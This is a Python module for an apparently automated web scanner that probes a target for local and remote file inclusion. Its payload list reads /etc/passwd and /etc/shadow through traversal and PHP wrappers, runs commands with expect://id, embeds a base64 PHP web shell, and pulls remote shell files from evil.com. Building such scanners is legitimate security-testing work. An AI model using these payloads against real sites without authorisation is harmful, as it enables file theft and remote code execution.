from .base import BaseScanner
from .registry import register_scanner
from core.models import ScannerManifest, ScanTarget, FindingSeverity

LFI_PAYLOADS = [
    # Path traversal
    {"param": "file", "payload": "../../../../etc/passwd", "detect": "root:"},
    {"param": "file", "payload": "../../../../etc/shadow", "detect": "root:"},
    {"param": "file", "payload": "../../../../windows/win.ini", "detect": "[fonts]"},
    {"param": "file", "payload": "....//....//....//etc/passwd", "detect": "root:"},
    {"param": "file", "payload": "..\\..\\..\\..\\windows\\win.ini", "detect": "[fonts]"},
    # PHP wrappers
    {"param": "file", "payload": "php://filter/convert.base64-encode/resource=index.php", "detect": "PD9waHA"},
    {"param": "file", "payload": "php://filter/convert.base64-encode/resource=config.php", "detect": ""},
    {"param": "file", "payload": "php://filter/read=convert.base64-encode/resource=/etc/passwd", "detect": "cm9vdDo"},
    {"param": "file", "payload": "expect://id", "detect": "uid="},
    {"param": "file", "payload": "file:///etc/passwd", "detect": "root:"},
    {"param": "file", "payload": "php://input", "detect": ""},
    {"param": "file", "payload": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7", "detect": ""},
    # RFI
    {"param": "file", "payload": "https://evil.com/shell.txt?", "detect": ""},
    {"param": "file", "payload": "http://evil.com/webshell.txt?", "detect": ""},
    # Null byte (older PHP)
    {"param": "file", "payload": "../../../../etc/passwd%00", "detect": "root:"},
]

PARAMS = ["file", "page", "include", "require", "path", "document", "folder", "root", "load", "read", "dir", "show", "view", "cat", "log"]


@register_scanner(manifest=ScannerManifest(
    name="lfi_scanner",
    category="exploit",
    risk_level="aggressive",
    estimated_cost=60,
    produces_tag_patterns=["lfi", "path-traversal", "rfi"],
    produces_endpoint_types=[],
))
class LfiScanner(BaseScanner):
    name = "lfi_scanner"

    async def scan(self, target: ScanTarget) -> tuple[list, list]:
        findings = []
        endpoints = []
        client = await self.get_client()

        base_url = target.url.rstrip("/")
        test_params = [p for p in PARAMS if p not in base_url]

        for payload in LFI_PAYLOADS:
            if self._stats["requests"] >= 60:
                break
            param = payload["param"]
            if param not in test_params:
                continue
            sep = "&" if "?" in base_url else "?"
            url = f"{base_url}{sep}{param}={payload['payload']}"
            try:
                resp = await client.request("GET", url, follow_redirects=False)
                self._stats["requests"] += 1
                body = resp.text or ""
                if payload["detect"] and payload["detect"] in body:
                    ep = self.make_endpoint(url=url, status_code=resp.status_code, discovered_by=self.name)
                    endpoints.append(ep)
                    severity = FindingSeverity.CRITICAL
                    if "etc/passwd" in payload["payload"]:
                        desc = f"Local File Inclusion via parameter `{param}` at {base_url}. Successfully read /etc/passwd"
                        title = "LFI — /etc/passwd Disclosure"
                    elif "win.ini" in payload["payload"]:
                        desc = f"Local File Inclusion via parameter `{param}` at {base_url}. Successfully read windows/win.ini"
                        title = "LFI — Windows win.ini Disclosure"
                    else:
                        desc = f"File inclusion detected via parameter `{param}` at {base_url} using {payload['payload']}"
                        title = "Local File Inclusion"
                    findings.append(self.make_finding(
                        title=title, description=desc,
                        severity=severity.value, endpoint=ep,
                        evidence={"url": url, "payload": payload["payload"], "matched": payload["detect"], "body_preview": body[:300]},
                        confidence=0.95 if payload["detect"] == "root:" else 0.8,
                        tags=["lfi", "path-traversal"],
                    ))
            except Exception:
                self._stats["errors"] += 1

        return findings, endpoints
